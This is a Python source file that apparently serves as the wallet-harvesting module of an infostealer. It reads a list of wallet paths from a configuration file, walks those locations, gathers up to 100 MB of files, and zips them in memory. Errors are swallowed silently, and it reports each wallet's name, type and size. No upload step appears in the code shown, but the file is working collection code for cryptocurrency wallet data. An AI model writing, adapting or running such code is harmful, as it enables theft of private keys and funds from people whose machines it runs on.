import os
import shutil
import tempfile
import zipfile
import io
from utils import load_json_config, expand_path

def scan_wallet_directory(wallet_path, max_size_mb=100):
    total_size = 0
    max_size_bytes = max_size_mb * 1024 * 1024
    files_found = []
    
    if os.path.isfile(wallet_path):
        size = os.path.getsize(wallet_path)
        if size <= max_size_bytes:
            return [wallet_path], size
        return [], 0
    
    for root, dirs, files in os.walk(wallet_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                size = os.path.getsize(file_path)
                if total_size + size > max_size_bytes:
                    break
                files_found.append(file_path)
                total_size += size
            except:
                pass
    
    return files_found, total_size

def extract_wallets():
    wallet_files = []
    wallet_config = load_json_config("wallet.json")
    
    for wallet in wallet_config.get("wallets", []):
        wallet_path = expand_path(wallet["path"])
        wallet_name = wallet["name"]
        wallet_type = wallet.get("type", "Unknown")
        
        if not os.path.exists(wallet_path):
            continue
        
        files, total_size = scan_wallet_directory(wallet_path)
        
        if files:
            wallet_files.append({
                "name": wallet_name,
                "path": wallet_path,
                "type": wallet_type,
                "is_directory": os.path.isdir(wallet_path),
                "files": files,
                "total_size": total_size
            })
    
    return wallet_files

def zip_wallet_data(wallet_info):
    if not wallet_info or not wallet_info.get("files"):
        return None
    
    try:
        zip_buffer = io.BytesIO()
        
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in wallet_info["files"]:
                if not os.path.exists(file_path):
                    continue
                
                try:
                    if wallet_info["is_directory"]:
                        arcname = os.path.relpath(file_path, wallet_info["path"])
                    else:
                        arcname = os.path.basename(file_path)
                    
                    zipf.write(file_path, arcname)
                except:
                    pass
        
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None

def get_wallets():
    wallets = extract_wallets()
    if not wallets:
        return None
    
    summary = []
    for wallet in wallets:
        summary.append(
            f"Wallet: {wallet['name']} ({wallet['type']})\n"
            f"Path: {wallet['path']}\n"
            f"Files: {len(wallet['files'])}\n"
            f"Size: {round(wallet['total_size'] / (1024 * 1024), 2)} MB\n"
            f"{'─'*40}"
        )
    return "\n".join(summary)

def get_wallets_summary():
    wallets = extract_wallets()
    if not wallets:
        return None
    
    summary = []
    for wallet in wallets:
        summary.append({
            "name": wallet["name"],
            "type": wallet["type"],
            "path": wallet["path"],
            "files_count": len(wallet["files"]),
            "total_size_mb": round(wallet["total_size"] / (1024 * 1024), 2)
        })
    
    return summary